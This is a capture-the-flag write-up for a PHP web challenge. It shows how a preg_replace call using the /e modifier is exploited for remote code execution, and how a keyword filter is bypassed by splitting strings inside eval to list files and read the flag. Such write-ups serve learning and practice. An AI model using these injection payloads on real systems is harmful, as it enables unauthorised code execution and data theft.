The initial webpage doesn't contain anything interesting and since the description says that no brute forcing is needed, just the most common files can be requested.

`/robots.txt` is present and contains a single entry `?lmao`. Requesting `/?lmao` gives the source for that PHP file:

```php
<?php
require_once 'config.php';

$text = "Welcome DarkCON CTF !!";

if (isset($_GET['lmao'])) {
    highlight_file(__FILE__);
    exit;
}
else {
    $payload = $_GET['bruh'];
    if (isset($payload)) {
        if (is_payload_danger($payload)) {
            die("Amazing Goob JOb You :) ");
        }
        else {
            echo preg_replace($_GET['nic3'], $payload, $text);
        }
    }
    echo $text;
}
?>
```

Here, both the pattern to be replaced and the replacement for `preg_replace` are controlled by user input, however the replacement string is filtered by `is_payload_danger`.

[Source](https://medium.com/@roshancp/command-execution-preg-replace-php-function-exploit-62d6f746bda4). `preg_replace` executes commands when the pattern has the `e` modifier, running the replacement string as PHP code and putting the generated value in place of the pattern to replace. The only problem is getting past the filtering.

Among the list of (sub)strings that are banned are `config`, `file`, `include` and `dir`, making usual approaches not work. However, `eval` is not filtered out, so these functions can still be constructed:

```
/?nic3=/W/e&bruh=eval('echo implode(",",scand'.'ir("."));');
```

returns

```
.,..,config.php,flag210d9f88fd1db71b947fbdce22871b57.php,index.php,robots.txtelcome DarkCON CTF !!Welcome DarkCON CTF !!
```

and then to get the contents:

```
/?nic3=/W/e&bruh=eval('echo fi'.'le_get_contents("flag210d9f88fd1db71b947fbdce22871b57.php");');
```

which returns

```
darkCON{w3lc0me_D4rkC0n_CTF_2O21_ggwp!!!!} elcome DarkCON CTF !!Welcome DarkCON CTF !!
```

(In later analysis, the flag file can be accessed via a direct request without the need for RCE.)
